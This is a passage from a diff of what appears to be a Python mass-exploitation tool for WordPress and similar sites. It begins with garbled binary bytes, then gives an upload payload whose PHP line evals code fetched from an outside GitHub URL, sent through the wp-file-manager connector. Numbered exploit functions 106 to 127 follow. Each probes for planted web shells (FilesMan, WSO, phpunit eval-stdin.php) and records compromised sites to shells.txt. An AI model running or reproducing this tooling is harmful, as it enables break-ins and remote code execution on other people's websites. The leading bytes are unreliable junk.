e\9b\97\1f\cc\012\df\bfy\f9\17IgR\f6y\f1]\c6\e6;\e4\ad\dfg\d8|G\16+?\ac`\f3\1d\f3\f2\ef::_^|\b7\b0\f9:\16k\fd\be\c5\e6\ebV\b2\f0Yf|\f1\f9\d6X\f1\c5~\8e\a5\cc\19\be2o\f8\d6\84q\c9\87/%_\f3k\8e\f8![=<>\be\cc\fc@\e13\ce\ef\1b\e5{\c1\89\ef\066\df\/\ffR\c6;\9c\f8\aeP\c6\bf\8c\f8\e2\c7\eb\bc\f3\8b\z>\c4\8b\ef#\cf73\e3\8b\9e\cf\12\ac\f8\1a\c7\c8|\99\d7w\04a=\8a\13_\f4z_\85\19\dfW\f8\f5T\ce\f1/e\bd\9as\fc\8b%\b43\c1\8c/\92 \f6\d8\f7\e7\f1\fbY\bc\fbo\af\b0\af\1b\f3\fe&j\041\14\ec\fb\c7\e6\\\df\03\c1\df\1f\b5\8b,_\ee\fe(D\01?tt1\f7\97<f?\ccB\fa\a3\8e1\83\1d\\faS\d7\11sc\1d\f0-\e2\ca\81\bd\bf\0f\bc'\db\8eF\f2\e0+\fe\c0\f5{\b2\f7\a7\16`\9f\8c\cfB\13|\c5;\d0\cePM\e8Q\bfB\14\07\f0\b7M\0b}\00\e0\8ds\eb\de/\e5\d7\b7,\a7\03|+4\c2\d7H\ad`\b7\b6\88|\17\a6\1fJ\ad\e0sK\11\c9\82o*\07\8f\03z'-\f4\b1)z\b2mu$\0f\be\f3_\b9\1f\d6\9cH\16|\85x\9d\fe%\d6\86\1f\84\10\c2Tr\c4\a4\1d\fe\a5\9a\e8\bb\0b\ef@\f2X}\fc\\ca\1f\93\d3]\9c^z\c1\fa\f9$\84\9d\8e\05\88d\c1W\88\a5n\94%~m\c7#5\f2\d70\9a\a1\9apz\15h$\0b\beB\88B\f3\c3\0c\e3\bb^\03\13\c9\81\af\10B\946\edn\f7\a8kw\d6p\bf\94\07\dfi\ceB\fd\d7\bc\f9\1b\e5\cd'o\feFF\de\f0\fd\f2\e7rVK\b4k\e9\b4B\8d\bc\a4\de\b3p/\dc\afG\b4\eb\fd\e0\e8\f1#'B\deS\bd\f4\e45\d5\bf\cf\a5\de\f3\da\11\0e\d9K\ef\94\1c\f9m\8d\1ay\97\b3\f7\ed>\83\1f\de\d3\f7\ed\e9\fb\f6\f4}\8b\fcimssss\cd\caE\fd\1ae\fb\fd\f5@J\f7\fe\c8n\e8?\fe-\07\ad\f4\eez\ab\da\e0\9b<\bfhF\16/~u,\8d\f15^\0f\e26o\15m\eb\d7\f83ie(\b6\18\a0\0b?$\a7+e\cf\d2\92\\e5Rl\c4\aaP\13|\d5\d6t\ee\be\86\f5[\9c\b3\9d\eb\d4\b5\e3\07s\eef\e3\a8\a2\1b\ff\be\9e\bf\b3t\a8\19\bei\9b\fbA/H\1d\ea\f7\1d|#W\07~H\df\da\0f:\ff\f1\f3/\a0u\e2V#|!\9d\13>\c0\fc\f5\fbN\a2:=\b8\f9\01\d6\f9\e3\f5\\b0\f3/\b0\f7\f2\b3&\f8B\9b\c9\c7\96\1e\f5\0b\ee\0cl\e9<?php @eval(\?>\.file_get_contents(\https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\));?>\\--------------------------66e3ca93281c7050--\\"""
-            # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=15)
-            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=5)
+            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 106 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php')
             else:
                 print ('[#] Exploit 106 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2385,17 +2385,17 @@ def exploit_107(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,timeout=5)
         if ('kill_the_net' in check.content.decode("utf-8")):
                 print (' [#] Exploit 107 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/license.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/license.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'kill_the_net' in check.content.decode("utf-8"):
                     print (' [#] Exploit 107 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/license.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/license.php')
             else:
                 print ('[#] Exploit 107 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2406,17 +2406,17 @@ def exploit_108(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,timeout=5)
         if ('Priv8 Uploaders' in check.content.decode("utf-8")):
                 print (' [#] Exploit 108 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/uploads/_input_3_codefam.phtml\n')
+                write_to_file('shells.txt', url + '/wp-content/uploads/_input_3_codefam.phtml')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Priv8 Uploaders' in check.content.decode("utf-8"):
                     print (' [#] Exploit 108 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/uploads/_input_3_codefam.phtml\n')
+                    write_to_file('shells.txt', url + '/wp-content/uploads/_input_3_codefam.phtml')
             else:
                 print ('[#] Exploit 108 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2427,17 +2427,17 @@ def exploit_109(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 109 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/wp-class.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/wp-class.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 109 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/wp-class.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/wp-class.php')
             else:
                 print ('[#] Exploit 109 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2448,17 +2448,17 @@ def exploit_110(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 110 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/fw.php\n')
+                write_to_file('shells.txt', url + '/fw.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 110 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/fw.php\n')
+                    write_to_file('shells.txt', url + '/fw.php')
             else:
                 print ('[#] Exploit 110 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2471,17 +2471,17 @@ def exploit_111(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 111 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/sketch/404.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/sketch/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 111 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/sketch/404.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/sketch/404.php')
             else:
                 print ('[#] Exploit 111 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2492,17 +2492,17 @@ def exploit_112(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 112 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/twentyfive/include.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/twentyfive/include.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 112 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/twentyfive/include.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/twentyfive/include.php')
             else:
                 print ('[#] Exploit 112 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2513,17 +2513,17 @@ def exploit_113(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 113 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp/wp-content/themes/sketch/404.php\n')
+                write_to_file('shells.txt', url + '/wp/wp-content/themes/sketch/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 113 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp/wp-content/themes/sketch/404.php\n')
+                    write_to_file('shells.txt', url + '/wp/wp-content/themes/sketch/404.php')
             else:
                 print ('[#] Exploit 113 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2534,17 +2534,17 @@ def exploit_114(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 114 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wordpress/wp-content/themes/sketch/404.php\n')
+                write_to_file('shells.txt', url + '/wordpress/wp-content/themes/sketch/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 114 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wordpress/wp-content/themes/sketch/404.php\n')
+                    write_to_file('shells.txt', url + '/wordpress/wp-content/themes/sketch/404.php')
             else:
                 print ('[#] Exploit 114 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2555,17 +2555,17 @@ def exploit_115(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 115 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/blog/wp-content/themes/sketch/404.php\n')
+                write_to_file('shells.txt', url + '/blog/wp-content/themes/sketch/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 115 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/blog/wp-content/themes/sketch/404.php\n')
+                    write_to_file('shells.txt', url + '/blog/wp-content/themes/sketch/404.php')
             else:
                 print ('[#] Exploit 115 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2576,17 +2576,17 @@ def exploit_116(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 116 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/site/wp-content/themes/sketch/404.php\n')
+                write_to_file('shells.txt', url + '/site/wp-content/themes/sketch/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 116 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/site/wp-content/themes/sketch/404.php\n')
+                    write_to_file('shells.txt', url + '/site/wp-content/themes/sketch/404.php')
             else:
                 print ('[#] Exploit 116 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2597,17 +2597,17 @@ def exploit_117(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 117 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-uploads.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-uploads.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 117 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-uploads.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-uploads.php')
             else:
                 print ('[#] Exploit 117 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2618,17 +2618,17 @@ def exploit_118(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,timeout=5)
         if ('taskname="phpunit"' in check.content.decode("utf-8")):
                 print (' [#] Exploit 118 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n')
+                write_to_file('shells.txt', url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'taskname="phpunit"' in check.content.decode("utf-8"):
                     print (' [#] Exploit 118 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n')
+                    write_to_file('shells.txt', url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
             else:
                 print ('[#] Exploit 118 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2639,17 +2639,17 @@ def exploit_119(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 119 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/xx.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/xx.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 119 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/xx.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/xx.php')
             else:
                 print ('[#] Exploit 119 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2660,17 +2660,17 @@ def exploit_120(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 120 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/bp.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/bp.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 120 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/bp.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/bp.php')
             else:
                 print ('[#] Exploit 120 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2682,17 +2682,17 @@ def exploit_121(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 121 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/admin.php\n')
+                write_to_file('shells.txt', url + '/admin.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 121 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/admin.php\n')
+                    write_to_file('shells.txt', url + '/admin.php')
             else:
                 print ('[#] Exploit 121 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2703,17 +2703,17 @@ def exploit_122(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 122 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/3x.php\n')
+                write_to_file('shells.txt', url + '/3x.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 122 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/3x.php\n')
+                    write_to_file('shells.txt', url + '/3x.php')
             else:
                 print ('[#] Exploit 122 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2724,17 +2724,17 @@ def exploit_123(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 123 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/twentytwentythree/styles/xx.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/twentytwentythree/styles/xx.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 123 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/twentytwentythree/styles/xx.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/twentytwentythree/styles/xx.php')
             else:
                 print ('[#] Exploit 123 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2745,17 +2745,17 @@ def exploit_124(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 124 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wso112233.php\n')
+                write_to_file('shells.txt', url + '/wso112233.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 124 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wso112233.php\n')
+                    write_to_file('shells.txt', url + '/wso112233.php')
             else:
                 print ('[#] Exploit 124 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2766,17 +2766,17 @@ def exploit_125(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8")):
                 print (' [#] Exploit 125 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
+                write_to_file('shells.txt', url + '/wp-content/index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8"):
                     print (' [#] Exploit 125 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/index.php')
             else:
                 print ('[#] Exploit 125 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2787,17 +2787,17 @@ def exploit_126(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8")):
                 print (' [#] Exploit 126 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/index.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8"):
                     print (' [#] Exploit 126 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/index.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/index.php')
             else:
                 print ('[#] Exploit 126 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2808,17 +2808,17 @@ def exploit_127(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 127 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/lock360.php\n')
